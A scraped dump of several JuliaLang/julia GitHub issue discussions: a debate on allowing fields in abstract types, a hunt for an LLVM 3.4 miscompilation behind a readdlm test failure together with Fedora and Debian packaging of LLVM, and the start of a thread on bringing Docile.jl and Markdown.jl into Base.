compile-time guarantee that the fields are there, but if they are not you'll get a clear run-time error, and to me that seems adequate.  Yes, and I want it for the same reason in JavaCall.  I had a few different implementations of an OrderedDict which were only slight modification of Base.Dict. One version (#2548) of this added an AbstractDict class above Dict and OrderedDict, which basically assumed that most of the current fields of Dict existed, and added two or three more for OrderedDicts. Jeff didn't like that at the time (see his comment in #2548), although without allowing fields in abstract types, that would probably be the most efficient way forward.  I have another datapoint for a use case where this would be very handy. I think that the general concept is when the operations defined on the abstract type require some state to be attached to the object (which is what @friend mentioned above) In AudioIO.jl the audio processing is implemented by creating a graph of AudioNode subtypes that each implement their own  function to generate audio (e.g.  renders a sinusoid,  calls the render function on all of its inputs and mixes them together). I wanted to enable waiting on AudioNodes, so I implemented , which waits on a Condition stored with the object. In order to do this I had to track down all the concrete subtypes and add the condition field to all of them. That's manageable if they're all implemented in this module, but as the number of AudioNode types grows and possibly becomes split across different libraries it's infeasible to have to go in and add a field to all of them. Allowing fields on abstract types seems like a win in this case, but there are alternatives  Do what I'm doing now which is to manually define all required fields in each subtype. This is error-prone, it's easy to forget one, and it especially problematic across libraries Create a AudioNodeState type, and all subtypes are required to have a field . That way if I add behavior to AudioNode that requires some state I can add it to the AudioNodeState definition. This actually seems like a pretty good solution that's conceptually simple and explicit. There's only one thing for subtype implementers to remember, and if they forget to add the field it will get found out the first time any state is accessed. Add a macro that defines the proper fields. This feels more magical than  and doesn't seem to gain much. Make AudioNode a concrete parametric type with the specific renderer contained as a field within, like  This feels a little heavy/complicated, but probably worth trying on for size. Given that we have a couple of seemingly pretty-good options, I'm actually less convinced than I was before that fields on abstract types are the right fix for this problem. It seems like having fewer patterns to choose from is a good thing, and I definitely agree with @friend that the locality and explicitness of Julia type declarations makes the code a lot easier to read. Thanks @friend and @friend for the discussion and ideas today, which helped to crystalize a lot of this.  I think the 2nd and the 4th alternatives are the most julian ones. And for this particular case, the 4th option seems to be the most meaningful.  Somehow I hadn't seen this thread. I somewhat feel like most of the requests for it are from people writing inter-op code for these other languages. (although this is off-topic for this thread) Let's close this issue then. I've never felt it would be a significant savings in any of my code. And it further confuses the difference between the ""thing"" -- a  -- and the behavior -- the . If anything, I would propose trying to make those more distinct (but that's a different topic for later).  Also late to the party ) One of the common use-cases put forward for fields on abstract types is to provide some base data and implementation that user code extends by derivation. But instead of derivation, isn't the Julian way to do this to make a generic type with the part the user adds being a type parameter. Then you separate the basic functionality and the extension parts cleanly, you properly express that the basic functionality can't be used without the extended functionality, you create an appropriate concrete type when its extended, and you even save typing )  instead of , what if this were reversed ? same underlying machinery, but the user can choose whether to inherit the fields or replace them (extending the fields is not allowed.  is not allowed). this avoids the two pitfalls of forcing the user to have fields they don't actually need and constructor dependencies. inner constructors would be inherited also i think this would make wrapping Gtk.jl much nicer and user-friendly, since Gtk has many of these inheritable concrete types. On the Julia side, most of these simply have a  field in julia (and an identical constructor), but a few of which have something else.  An example of how this will be useful is in creating an . Julia immutable FinancialTimeSeries{T&lt;Float64,N} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type OrderBook{T&lt;ASCIIString,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type Blotter{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type FinancialPortfolio{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free blottersVector{Blotter} end type FinancialAccount{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free portfoliosVector{FinancialPortfolio} end ♠` Though I likely mucked up the syntax, the basic idea is that new custom time series types are easy to construct, and new fields can be added.  Would we allow new inner constructors in the derived type? Would  in the derived type invoke an inner constructor of the base type?  Yes, I would think it useful to add invariants, but every derived type would at least have the abstract invariants, which includes the length of the time array matches size(values,1) and colnames matches size(values,2), as well as dates must be sequential and in descending order.  just to be clear, my proposal explicitly disallows partial inheritance of fields. it is strictly limited to selectively allowing concrete types to be used as abstract type names. (with special syntax to indicate that the derived class has exactly the same fields and constructors as the original type)  I think that we have considered abstract types with fields in the context of trying to solve a number of different problems, but looking at this discussion it seems to me that if they should be used for anything, it should be to address the cases where you would currently create either  a parametric type with a specialization field or (the subtype's data is a field in the supertype) a common type that would be used for the same named field in each of the subtypes (the supertype's data is a field in each subtype)  (alternatives 4 and 2 above from @friend respectively), because you want to create a family of types with some common storage and behavior.  Once upon a time, there was an idea to disallow field access such as  in all cases except when the concrete type of  was statically known. If you didn't know the type of  when you wrote the code, how could you know what its fields signify? The way I understand it, this restriction was not implemented because it was deemed too useful to be able to have a family of types containing some same named fields. But this seems to be exactly what abstract types with fields would address! How about restricting field access like  to cases where it is statically known that  exists? The statically known type of  need not be concrete, as long as the fields in question would exist in it. To ensure the separation between abstract type and subtypes, access to the fields of the abstract type could require that that type be used, not just a subtype of it. This would give a complete namespace separation between the fields of the supertype and subtype. It could go a long way to avoiding the fragile base class problem, by forcing a proper interface between supertype and subtype. Of course, it remains to be defined what the statically known type of an expression would mean.  Once we make  syntax overloadable then it will be just like writing . We never statically disallow generic function application, but this would be the only place in the language where we do that? That doesn't really make any sense.  I will readily admit that I'm not at all convinced that this is the way forward. What troubles me most is  introducing and defining an entirely new mechanism in the language. Still, I find the idea interesting enough to investigate it a bit further I agree that we shouldn't statically disallow generic function application. Another way would be that, instead of having  as syntactic sugar for , to make it stand for getfield(a, Field(b), static_type_of_a)  where the last argument gives the static type that the field is looked up in. Actual fields would correspond to signatures like getfield(aA, Field(b), Type{A}) = ...  # implicitly created for field b in type A  so that they could only be accessed using the same type as they were defined in. Properties, on the other hand, could and probably would be made to apply for a range of static types, i.e. getfield(aA, Field(myproperty), Type) = ...   getfield{T&lt;MySuperType}(aA, Field(myproperty), Type{T}) = ...    to make them available regardless of static type, or given any static type  respectively. This is still different from the mechanisms that exist now. The reason to make it different would be that access to actual fields (not properties) is different - it is an implementation detail and not an interface. But I am still not sure whether it would be worth it.  That's why this whole issue gives me pause. Inheritance in Julia is about behavior, not structure. And that's a good thing. Conflating inheritance of behavior and inheritance of structure is precisely the mistake that C++, Java, et al. have made and it causes all sorts of problems. It may make sense to introduce some mechanism for structural inheritance in Julia, but I don't think it should be confused with – or tied to – behavioral inheritance.  Yes, I think you are right. If it shouldn't be tied to behavioral inheritance, then I guess it shouldn't be tied to subtyping at all. It would be interesting if we could come up with a way to address the family-of-similar-types problems that have been discussed here that is not tied to subtyping, but I suppose that this issue is not the forum to discuss it.  The distinction between inherited behavior and not structure is useful in navigating how to think about this problem. I was certainly getting lost in the thread before you spelled it out that way.  In my point of view this PR is closely relate to #1974 and #5. If we decide field overloading should not be done this PR makes a lot more sense. While I agree about behavior vs. structure thing, there are cases like Gtk.jl as Jameson mentioned where abstract types with fields are handy. But #4935, #1974 and #5 should be seen in shared context. Abstract multiple inheritance and a way to define (and check) interfaces in a formal way is IMHO the most important of these issues.  I'd like to point out that the decision to disallow concrete type inheritance may also be supported by the fact the in the c++ world inheriting from concrete types is considered conceptually problematic, too ""Item 33 Make non-leaf classes abstract""  @friend Coming from the c++ world I disagree. The design the author chooses from that article doesn't look like a good design to me, but I don't see how it argues against inheriting from concrete types. There are plenty of places in both the standard libraries, semi-official libraries (e.g. boost), and others which use inheritance. In fact if you don't allow inheritance from concrete types you essentially have Java's interfaces. There are many complaints you can find for why this can make for bad design. I understand the arguments against multiple inheritance with concrete types. That's why some languages like Ruby, Scala, and Swift have some concept of mix-ins.  My view is that inheriting from concrete types is illogical. This fact then manifests itself as problems in various flavors depending on the language. Definitely the specific problem described in the c++ article does not affect Julia, but I thought it might be useful to provide a broader context for the question. The article is an excerpt from Scott Meyers ""More Effective C++"". In my opinion, it makes sense to subtype concrete types only if the subtype specifies a subset of the already given possible values of the type being subtyped. Subtyping Int64 to get the type of e.g. even numbers would be OK. I am for abstract types with fields and interfaces.  I think many problems of various languages related to inheritance are due to not separating ""conceptual"" and implementation inheritance well enough. In this respect, Julia is in my opinion very well designed. Nevertheless, things like multiple abstract inheritance and interface specifications (of which fields in abstract types are a special case) would make the design more ""complete"".  @friend but would you consider the fields to be part of a public or private interface? My take is that multiple abstract inheritance and public interface specifications are the most important issues to be solved in this area. Private interface specifications (which this issue is IMHO about) are neat but also make the language more complex.  @friend For Julia I'll agree with you (I think subclass from concretes works okay for languages like C++ and Python). I agree with your other statements.  @friend  I might be wrong, but it seems like the private/public debate is a separate issue. You could assume for now everything is public without breaking anything.  AFAIK, at the moment type-fields are considered private and the function-interface is public.  For instance, it's  and not .  I don't think that the private/public debate is a separate issue. This is the key issue when we talk about overloading Note that this of course only applies to mutable types. For immutables, the fields are the public interface.  I can see where it is an issue for overloading the  operator, but is it also an issue for abstract types with fields?  There needs to be a separation between interface and implementation.  ATM they are the same thing, so any inheritance (meaning is-a) also would inherit the fields of the abstract type, an implementation artifact.  But the derived type may wish to provide a completely different implementation.   So the two things need to be separated.  That is where most languages fall down and Julia has the chance to get it right.  @friend You are absolutely right that interface and implementation have to be separated. If we say that only functions are the interface (e.g. , , ... of an AbstractArray) then the fields are implementation details. The abstract types with fields would however not really hurt this thinking. They would just be a convenient feature in some very OO-like situations. AbstractArray would not be such a thing. Personally I would avoid situations with deep inheritance hierarchies where abstract types with fields (heck we need an abbreviation for it ATWF) are really needed. But here we get into a subjective area and if @friend likes this programming style I don't really see the issue with this feature.  I think the following example is worth discussing We have an  type and want to extent it with physical dimensions Solution a) Introduce a new  type that has as field an ordinary  and a tuple of spacings. Problem We have to forward all the methods. Solution b) Let the entire  implementation ""open"" and define all the methods for the abstract type with fields . Then a trival concretization gives us our  type.  could now be derived from  in the same way ( with trivial concretization . While I am personally more a fan of solution a) I can absolutely understand that people also like b). It would certainly make the language a little larger. But I am not sure if this is such an issue at this front where it is hard to force people to use a certain programming style.  @friend, (a) seems like a more flexible approach, and with a  helper macro (#3292) it need not be so difficult as it is now.  @friend I think issue #7442 shows a fair example of wanting abstract types with fields without having a deep hierarchy. Besides grouping (which requires a lot of boiler-plate functions) or copying of code (which violates DRY) I don't see a good way to implement those classes.  @friend I am absolutely in line with you. I am just not sure if this has a clear better / worse answer or if this is about taste. @friend is apparently of a different opinion and I was not able to convince him that (a) is a clean solution.  I think how well (a) works depends on the number of fields defined. In #7442 I tried both copying the variables and forwarding. Even with a small number of variables both involve writing a lot of extra code -- imagine the non-simplified version with many more fields.  Abe, I know that we are going full circle now, but for completeness here is the version that uses the  relation. abstract Player  type PlayerFields   positionArray{Float64, 1}   rotationFloat64    end  type PlayerA &lt; Player   basePlayerFields   nameString   PlayerA() = new( PlayerFields([0.0, 0.0], pi),  ""foo"" ) end  type PlayerB &lt; Player    basePlayerFields    PlayerB(posArray{Float64, 1}, rotFloat64) = new(PlayerFields(pos, rot)) end  move!(playerPlayer, velocityArray{Float64, 1}, dtFloat64)   player.base.position += velocity*dt end  a = PlayerA() b = PlayerB([10.0, 10.0], -pi) move!(a, [0.1, -0.1], 0.1) move!(b, [0.1, -0.1], 0.1)  You might not like it but it seems that many Julia developers got used to this. Typically the  type is not so artifical but stands on its own. Just one other side note. In C++ inheriting from stl-containers is not encouraged. This has of course again specific C++ reasons but it is yet another example where  is favored.  @friend You can do that (and I think that's also in #7442), but then you have to know that every player has a field named . This seems like something a compiler should enforce. You can get around that problem (also in #7442) by defining an interface with methods, but then you have a ton of extra code that you have to write. Both approach seem sub-optimal to me and a place where the compiler can help out. This could potentially provide better error messages, opportunities at optimization, and cleaner code. The thing with c++ is it that it tries very hard to be paradigm free. There are specific cases where you don't want inheritance. But it's no uncommon to employ inheritance with templates (especially template hacking). Most of the time you only ever want to use single inheritance, except for those times you really need multiple inheritance. I think that's what makes it such as successful language -- it tries not to impose its ideals on you (some Java did entirely incorrectly, IMHO).  We generally take the approach that features that serve to constrain what the programmer can do are unimportant, while features that allow programmers to do more things more easily are very important. Arguing for features so that the compiler can prevent people from doing things is unlikely to be particularly persuasive around here – that's just not the Julian attitude.  @friend I think this is very much the case of helping the user out, and I probably should not have used the word 'enforce'. I don't see how adding fields to abstract types would in any way constraint the user.  Right, the feature part doesn't at all constrain the user. But, if the main point of the feature is to tell the programmer when they got something wrong, then that's the limitation thing again. I was all for this until I realized that all it saved was a bit of typing and means that a subtype of an abstract type with fields cannot not have those fields – and it's entirely plausible that a subtype might decide that it wants to store the fields that the supertype declared in a different way, such as part of the type or computed from other fields. This comes down to inheriting structure versus behavior. Inheriting structure is restrictive, while inheriting behavior is not.  Agree with @friend plus one for not requiring subtypes to inherit fields. Given Julia's target market, fields being large arrays will be likely to naturally occur, so forcing subtypes to inherit them would be costly if the subtype doesn't need them.  @friend, I'm a little confused by this point. Since I don't believe it will be possible to instantiate abstract types, it's not obvious to me how the size of arrays (a property of objects, not of types) could pass between abstract types and concrete types. Did I miss part of the conversation?  @friend as I understand the discussion it is about allowing abstract types to have fields that can be inherited by subtypes and at some point a concrete type that can be instantiated with those fields. The point is that requiring the inheritance of such fields could be expensive if the field is an array, but the methods on the concrete type did not use that information, as @friend said.  @friend But you can always choose not to put fields in the abstract type. It's only there if the design calls for it. @friend Likewise, if not all concrete types require that array, it shouldn't be in the abstract type. You should only have the fields that are common to all concrete types. If you use the grouping technique as suggested before (i.e. make another type that collects all common fields) you have the exact same problem. But if you don't group in a common type then you potentially have to copy and paste code in order to make sure no field name changes.  @friend that presumes that a hierarchy is designed at one time by one group who ""control"" the entire hierarchy.  But one of the key things about Julia is the existence of a package system to publish such hierarchies for use by others. To the initial designer of the abstract type provided by a package it may make perfect sense to include fields in line with their initial use-case.  But Julia users can create their own subtypes adding implementations that the original abstract type designer never thought of. Forcing fields to be inherited may impose unreasonable costs on the new implementation.  But since some other users of the abstract type may use the inherited fields, they cannot simply be removed without breakage. It should be up to the subtype implementation to decide if it needs to inherit the fields from the parent type.  It is of course then the subtype implementer's responsibility to overload any parent method that uses fields they do not inherit.  @friend That's true with many other languages besides Julia (e.g. Python and Ruby). A library could in theory do something like This gives the most flexibility as it  Doesn't impose fields in the way that you are worried about Provides a method to write more generalizable code (i.e. you know the fields exist in the method so you don't have to (a) check the existence of the field, or (b) deal with errors if the field doesn't exist).   I have a type named  that wants to reuse all the available methods in the  type found in the TimeSeries package. Here is the current  design needs some more information (stock ticker, tick size, currency, etc) so to achieve this there are three alternatives. The first one simply copies the  code and extends it. The only method that is reusable is the  method. metadataTimeArrayjulia immutable TimeArray{T,N,M} &lt; AbstractTimeSeries     timestampVector{Dates}     valuesArray{T,N}     colnamesVector{UTF8string}     metadataM end The problem with is nesting is that you would need to redefine  and other methods. This can be done with one-liners though So now we we have a nested type that includes a nested type. Does this cause a performance hit? I would imagine so but I haven't tried it to find out.  @friend My point was that allowing fields in abstract types doesn't impose any constraints on the user. I don't think it's difficult to imagine a realistic example given in #7442 with 5-10 more fields, at which point the design you gave above becomes difficult to maintain if you have a decent number of  subtypes. One project I'm working on has just that. @friend also posted another example while I was typing my response. It may not come up a lot on the mailing lists, but I don't think that doesn't mean it isn't useful (or there aren't people who would use it). Also, multiple inheritance, which you have argued for (and I agree with), only shows a handful of hits when I search on the Julia user list. The problem with using methods to define the public interface is that the compiler isn't doing any checks for you. Sure, you know the method exists, but you don't know if the subtypes actually have fields you are accessing. Thus, you will only find the error at runtime, and are therefore just moving the problem around, but not actually solving it.  @friend What about this abstract AbstractTimeSeries  immutable AbstractTimeSeriesFields{T,N}     timestampVector{Dates}     valuesArray{T,N}     colnamesVector{UTF8string}     end  # Now there are all the methods that operate on an AbstractTimeSeries # they assume that every AbstractTimeSeries has a field ""base"" of type AbstractTimeSeriesFields # One example follow  length(tAbstractTimeSeries) = length(t.base.timestamp) # don't no if this is the correct length... but you get the idea  immutable TimeArray{T,N} &lt; AbstractTimeSeries     base{T,N}     # Might need a ""nicer"" constructor that hides AbstractTimeSeriesFields end  # Despite the constructor TimeArray needs 0 new methods  immutable FinancialTimeSeries{T,N} &lt; AbstractTimeSeries     base{T,N}     stockStock     # Might need a ""nicer"" constructor that hides AbstractTimeSeriesFields end  # Again all the AbstractTimeSeries methods are automatically available.  I don't think that there will be any performance hit in the indirection but if you are concerned about speed you have to benchmark it.  @friend It is true that it is not such a good measure how often something comes up on the mailing list. Abstract multiple inheritance is something where no simple workaround is available and which is quite standard in other ""interface"" languages such as Java and C#. Further, there are some packages where this was/is really needed but the discussions where not on the mailing list but on github issues. After all we can duck-type as a valid workaround which leaves all type checking out however. But anyway, I am not a core dev and just wanted to convince you that the lack of abstract fields with types can be easily emulated with simple means and without cluttering the code. But since you are not convinced maybe the best way to get this in is to prepare a PR that implements this. I would vote for merging it in the case that overloading field access will stay unpossible.  This seems to have been fairly well-exhausted with the consensus leaning towards not having it. Objections to closing?  It was my understanding that it was still under consideration, just not necessarily in the near future. That might also just be wishful thinking.  I wrote a quick macro to do abstract types with fields on the user-side  very simple, and could probably use more work, but I think it's argument for not introducing 'Abstract Types with Fields' into the language directly (at least for now). If people want the feature, they can use it, and if it's considered useful enough, it's possible to reconsidered for inclusion into the language. On a side note, it would be nice if extra syntax was allowed for macros. Currently to use the macro you have to do It would look more seamless (and perhaps help testing new features) if I could write  will work fine. Choose whatever macro name you want, of course. This is the approach we take in StrPack.  No problem--what you've done looks pretty similar to what StrPack does now, in fact.  I guess with #20418 we could now consider ",248,9,1751,0,0,1043,39,
JuliaLang/julia/6757,0.2001882015,JuliaLang,julia,readdlm test failure on 64-bit Fedora with LLVM 3.4,15169,167,201,0,5,"I see this failure when running tests in my RPM package in 64-bits on a Fedora build machine. This is with git master as of today. Funnily the test passes on my machine; is it because it's been fixed in the recent hours?  Strange... Is the  file present and can be found from where the tests are running? Sorry, I don't have access to a Fedora machine, could you run the failing test from the REPL?  @friend As I said, I'm not able to reproduce the bug on my machine, only on the Fedora build VM. Could you suggest a few commands I could add so that the needed debug info is printed when building the package?  Sure. Start the REPL in the test folder f = joinpath(""perf"", ""kernel"", ""imdb-1.tsv"") isfile(f) dlm_data = readdlm(joinpath(""perf"", ""kernel"", ""imdb-1.tsv""), '\t') ♠`  @friend I can't reproduce the bug at the REPL. It would be nice if you could think of a few things which could fail, so that I put a series of debugging statements in my RPM package, and get the logs after the build runs. I'll test that the file exists, but I can't see any reason why it could be missing, so I'd like to test a few other possibilities if you have ideas (each build takes some time to start).  A complete traceback of the exception would help identify the source line where  occurred and then we can add more debug statements. So, if the file exists, just a  of that file would print the exception stack.  OK, got it. I think this is related to the fact that I build the RPM package against LLVM 3.4. Unfortunately, that's the only available version in Fedora 20. I've eventually simplified the command to this And I'm able to reproduce this locally when using LLVM 3.4. Do you think it's worth trying to fix? Without support for this version I'm not sure I'll be able to package Julia for Fedora -- though I need to investigate this issue since in the long-term this may prove problematic.  I use llvm 3.4 on Mac and haven't seen this failure.  That's weird. Going back to 3.3 (where possible, it's a little hackish on Fedora 20 now) clearly fixed the problem.  Any ideas about how I could debug the problem further?  Cool! -)  I was able to replicate this on a ubuntu 13.10 machine as well. Also observed that in method , the values in tuple  mysteriously change sometime after the call to  at line 293 (). Adding debug statements in the method shifts the problem around. Looks like some corruption?  Was that in llvm 3.4 or 3.3?  Also happens in 3.5.  Removing 0.3 milestone, as 0.3 uses LLVM 3.3 only. We can reprioritize if this turns out to happen with LLVM 3.3 as well.  Yet it's going to prevent me from packaging 0.3 in Fedora. Not saying it should be a blocker, but it's still relatively annoying.  Is that because fedora will only support llvm 3.4? They really shouldn't do that. Different versions of llvm are in general quite incompatible.  Yeah, that's something I'm going to discuss with them. LLVM maintainers recently updated to 3.4, and for now I seem to be forced to follow this change.  That is a bummer if we can't be in the next fedora release.  I've just asked LLVM Fedora maintainers about this problem  If the fix does not require major work, it would be really nice if we can fix this issue for LLVM 3.4 for the 0.3 release.  Yeah, that and all the other bugs we don't yet know about.  I am sure there are others. Let's see what the Fedora LLVM maintainers say. Otherwise, IIUC, we could be in the fedora-updates repository.  Yeah, there may well be other bugs hidden somewhere... At least tests should catch the most important ones. @friend fedora-updates is the normal place were new packages appear, and that's really not a problem to be there. The question is rather, can Julia be included at all? But we'll likely figure out a solution.  Not sure how useful this is, but the cutoff point to get this error is around 15 lines. For example,  works, but  fails. (It's sort of context-dependent, as taking  fails at . so maybe total # characters).  I see the same change of  that @friend sees, and it appears to happen between when  calls  and the catch block for the  thrown by . When I try to print  in the catch block, the  value is correct, but I get a segfault in  because one of the arguments has been nulled out. So it seems like we are clobbering the stack somewhere.  Here is where  is changed. Manually resetting this address to 16 allows the read to complete without the . @friend any ideas? why would we be passing a tuple on the stack and then overwriting that space? calls jl_alloc_tuple 0x00007ffff45b6214 &lt;julia_dlm_fill;17354+532&gt;   ff d0   callq  *%rax    0x00007ffff45b6216 &lt;julia_dlm_fill;17354+534&gt;   48 89 c3    mov    %rax,%rbx    0x00007ffff45b6219 &lt;julia_dlm_fill;17354+537&gt;   48 89 9c 24 98 01 00 00 mov    %rbx,0x198(%rsp) fill the tuple 0x00007ffff45b6221 &lt;julia_dlm_fill;17354+545&gt;   0f 28 44 24 60  movaps 0x60(%rsp),%xmm0 =&gt; 0x00007ffff45b6226 &lt;julia_dlm_fill;17354+550&gt;   66 48 0f 7e c7  movq   %xmm0,%rdi ♠  I'll have a look at this. Thanks for the through analysis so far.  @friend Hi. For demonstration purposes I've built julia from your SPEC file on build.opensuse.org, which has Fedora 20 as build target, but Fedora there is as it was released, e.g. no fedora-updates. So it still has LLVM 3.3. Tests were passed successfully. See the link  see you cannot use these packages in up-to-date Fedora 20, but only with original, released image. These packages are for demonsration only.  @friend Interesting. Actually, I can do the same using Fedora's Copr build service. As you said, the problem appears when trying to install the package, since LLVM 3.3 conflicts with the latest Mesa from fedora-updates. It would be interesting to try to adapt the various Fedora packages to SuSE.  @friend Hm, how do you restrict a build job on Copr to use Fedora w/out updates? I see someone tried to build julia on openSUSE, if you search for a 'julia' on  @friend Actually, I don't need to it seems that the 'fedora' repo is available from Copr, even if 'fedora-updates' is available too. Making the Julia package depend on LLVM 3.3 works. Regarding openSUSE packages, IIRC the existing Julia package bundles all dependencies, and to get included in the distribution one should package libraries separately as I did for Fedora. But we're really out of topic here, better move the discussion elsewhere.  I see this can be reduced to just julia&gt; readdlm(IOBuffer(""a\na"")) ERROR BoundsError()  in setindex! at ./array.jl308  in colval at ./datafmt.jl324  in store_cell at ./datafmt.jl195  in dlm_fill at ./datafmt.jl303  in dlm_fill at ./datafmt.jl316  in readdlm_string at ./datafmt.jl276  in readdlm_auto#88 at ./datafmt.jl59  in readdlm#86 at ./datafmt.jl49  in readdlm#84 at ./datafmt.jl46  But this one works, with extra space at the beginning of string  Same issue with readcsv (one backend)  FWIW, we're probably going to be able to use LLVM 3.3 in Fedora (even though this may take a bit longer). Doesn't mean this bug shouldn't be fixed, of course!  @friend do you had a chance to look into this?  I looked at briefly, but never got to isolate it. It's on my todo list though (I wanted to work on it today, but got held up by #7868). I can confirm that this is an optimizer bug though, so the first thing I'll do tomorrow is disable passes and see what makes it work.  Just to point a fix to this issue would help for the official Debian package. The next release of Debian will not feature LLVM 3.3, only 3.4 and 3.5 (the Debian maintainer of LLVM says that 3.3 is too old now and unmaintained). And the Debian freeze happens on early november, so Julia 0.4 will not be ready by then. So my only option is to ship Julia 0.3 with LLVM 3.4 or 3.5.  We can do a point release of Julia 0.3.x that uses LLVM 3.5.  @friend That would be great. The Debian deadline is roughly end of October, but even if the point release happens after that, I could still backport patches that are on the 0.3 git branch.  Also, the general attitude that distros have about LLVM is not reasonable or healthy. LLVM is not a normal library that you can just upgrade or downgrade willy nilly – it is core infrastructure for building compilers and programming languages – the exact version matters a lot. By contrast, every distro seems to let you choose among a dozen different Python versions. Yet no one is willing to support more than one arbitrarily chosen version of LLVM at a time.  Yes, we will have to do a julia 0.3.x release built for LLVM 3.5 in order to support various distros.  Can still get GCC versions back to 4.4 in Debian and plenty of other distributions. Treating LLVM any differently makes zero sense.  @friend For the particular case of Debian, there are several LLVM versions coexisting. Currently there are 3.3, 3.4, 3.5 and 3.6-svn in Debian unstable. But 3.3 is going to be removed soon, because it is considered too old and unmaintained.  Yes, upstream has stopped maintaining it, is the main reason. In any case, there is very little we can do about these policies. I do wish that they would let us ship with our own copy of LLVM 3.3, which we can install in  instead of system directories. Not allowing that seems excessive.  I think @friend recently started doing exactly that in his PPA - since we only statically link to LLVM and don't install any of its headers, the only downside to doing it that way is compile time.  @friend If I were shipping a private copy of LLVM 3.3, I would still have to maintain it for the lifetime of Debian Jessie, which means for the next two years. At least I would have to track security issues. Given that it's already unmaintained upstream, it is an unnecessary burden which nobody is willing to take in Debian.  What I have taken to doing in the Ubuntu case, is building our own LLVM, statically linking it with Julia, and calling it good.  Note that there are no LLVM products that are shipped with Julia in this case; everything is statically linked into , so there's no chance of it messing with other installations.  There is still the maintenance burden though.  I completely understand you not wanting to maintain LLVM 3.3 for Debian, but declaring a version that is less than a year old completely dead is kind of strange. We may just have to declare that LLVM is part of the Julia source and not even pretend that linking against it as a shared library provided by the distro is going to work.  @friend The decision that LLVM 3.3 is dead was taken by the LLVM developers, not by Debian. Embedding a copy of LLVM 3.3 in Julia will not solve the issue, at least for Debian, for reasons explained above.  I understand that the constraints of a distro like Debian are different than yours. And at a personal level, I cannot do much about the decision to remove LLVM 3.3 (I tried to argue with the Debian maintainer), and I cannot embed a copy of LLVM 3.3 in the Julia package because this completely goes against the spirit of a distro and could create problems with other parties (such as the security team). My current plan is to ship Julia 0.3 with LLVM 3.5. But if this is something that you definitely don't want to see happen because it could give a bad image of Julia, then the only option left is to not have Julia in the next Debian release. This would be sad, but this is not the end of the world either.  Having a buggy version of Julia in the distribution is probably better and easier to fix later than no version at all, though that's up to Stefan, Jeff, Viral etc to decide. Sounds like this maintenance policy question really needs to be raised on the LLVM list, as more and more downstream projects depend on and distributions need to include specific older versions, and this is starting to interact poorly with LLVM's fast break-everything development style (which has other benefits, but gets in the way here). I know Rust has their own set of problems wrt distributions and bootstrapping, but what happens when Rust hits 1.0 for example? They're probably going to need to support a fixed version of LLVM for a while.  I wasn't under the impression that Debian liked to ship buggy versions of things, but apparently they prefer that to allowing us to link to, you know, our dependencies. We could stand to get a better sense of how well julia 0.3 works with LLVM 3.5. We know there is a failing test, but we should try commenting out that test and see if everything else passes at least.  I'm currently discussing the same issue for Fedora. I may be allowed to use LLVM 3.3 for the next release, but it's not sure yet.  more out-of-tree compilers like Julia and Rust rely on LLVM, it seems they really should review their release policy.  @friend On my 64-bit machine, I can confirm that  is the only failing test with LLVM 3.5.  That's nice. Keno and several others have been going above &amp; beyond to try to keep julia working with LLVM 3.5 reasonably well.  3.5 has OldJIT still... we could switch that back on with 3.5, although that setup is untested - whereas several of us have been using mcjit regularly. On Aug 9, 2014 354 PM, ""Jeff Bezanson"" notifications@friend.com wrote  Has anybody tested the performance of the old jit vs mcjit? I remember having read that the old jit was faster. Is it really an issue to have a package that has a statically linked llvm3.3? How do we do it with libuv? Isn't our version patched so that we cannot use upstream?  I'll have another go at the readdlm thing next week. Hopefully I can figure it out in time for the 3.5 release.  @friend Indeed libuv is included as an embedded copy in the Debian package. But first, this is supposed to be a temporary situation (see the JuliaLang/libuv#2). And second, libuv is a much smaller codebase than LLVM. Which means that it is much more manageable to maintain a forked embedded copy of libuv than one of LLVM.  I've started to run some experiments on which IR passes cause this in order to try to identify the IR pattern that gets miscompiled. First results Encouraging isn't it ;)?  Seems to be a problem with LLVM's Stack Slot coloring  Specifically, stack slot sharing Feels like I'm getting closer )  Here's a debug dump from the stack coloring pass The second one is with sharing disabled. As you can see the first one deletes two stack slots. Of course this isn't necessarily a problem with the stack coloring pass. It might also be a problem with the analysis pass that it uses.  @friend Why were you thinking the tuple is passed on the stack. From looking at the generated code, the callee is expecting it in xmm.  As far as I can tell, the stack coloring transformation is correct, so I wonder what's going on.  Wow, nice sleuthing! (I missed your question last night...) limping through the disassembly, more or less.  Also, for posterity and general enjoyment, here's the code I wrote to track this down  I see you use  as the extension for your C++ source files now ) The application of julia metaprogramming to C++ here is absolutely mind-boggling.  Whoa. When you go bug-hunting, you carry some heavy weaponry! Poor things don't stand a chance.  Yeah, I love the  This is nuts. @friend, you've outdone yourself. ",73,9,653,0,0,545,25,
JuliaLang/julia/8514,0.087395185,JuliaLang,julia,Integrate Docile.jl and Markdown.jl into Base,29528,301,173,0,4,"Some good discussion started here. This is to more formerly track integrating the necessary parts into Base since it seems some good consensus is building. @friend @friend  I'd be happy to get going on this. Also pinging @friend since he's be the source of some great input here. I'll put together a PR over the next few days.  Also pinging @friend who originally suggested to me about Docile.jl as a good starting point. Also @friend has been looking for this.  @friend I recommend waiting until I've worked through overhauling Markdown.jl before finalising anything / setting up PRs. There will probably be some technical changes to work out within Docile/Markdown to get the string macros etc. working smoothly.  Yes, just saw your  branch. I'll wait on your changes.  Docile does look quite good. I'm wondering about  Maybe we should add some special syntax to avoid the  How much can we cut down the dependencies?  For point (2), I feel the system should be as lazy as possible, just populating metadata with strings until interaction and display happen.  Special syntax would be nice. The  is providing the  that I'm using to get file and line numbers for metadata. Would be great to retain that info. Docile doesn't really have any dependencies, it's just harvesting strings and metadata. Lexicon's providing the presentation layer. I agree about the laziness -- I don't have any hard numbers, but when I was parsing docstrings during  package loading was quite a bit slower.  Another thing that needs to be hashed out is what non-standard form of markdown we wish to support.  Inline latex, tables, and cross references seem necessary.  @friend CommonMark [1, 2] looks reasonably promising. Inline math is a must-have feature  -- not sure whether that would be part of the spec though. [1]   HttpServer now uses Docile (thanks to @friend), which could be another interesting case study  That's cool, thanks @friend. Guess I can't make breaking changes now!  I think this is the right way to go. I agree with Jeff's point that special syntax would make Docile nicer to work with.  CommonMark doesn't have any standard for embedded equations; see this discussion.   Pandoc's  + heuristic (opening $ can't be followed by whitespace, closing $ can't be followed by a digit or preceded by 